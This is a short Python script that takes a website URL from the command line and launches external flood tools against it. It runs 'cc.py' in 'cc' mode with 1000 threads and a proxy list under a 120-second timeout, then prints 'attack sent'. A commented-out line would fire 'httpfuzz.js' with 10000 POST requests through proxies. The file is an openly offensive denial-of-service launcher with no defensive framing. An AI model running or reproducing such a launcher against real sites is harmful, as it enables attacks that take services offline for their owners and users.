import sys
import subprocess

if len(sys.argv) < 2:
    print("Please provide the website URL as a command line argument.")
    sys.exit(1)

website = sys.argv[1]
print (website)
#subprocess.Popen(["node", "httpfuzz.js", website, "proxy.txt", "10000", "POST"], stdout=subprocess.PIPE, stder>
process = subprocess.Popen(["timeout","120s","python3", "cc.py", "-url", website, "-m", "cc", "-v", "http", "-t", "1000", "-f", "http.txt", "-b", "1", "-s", "2592000", "post"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
print("attack sent")

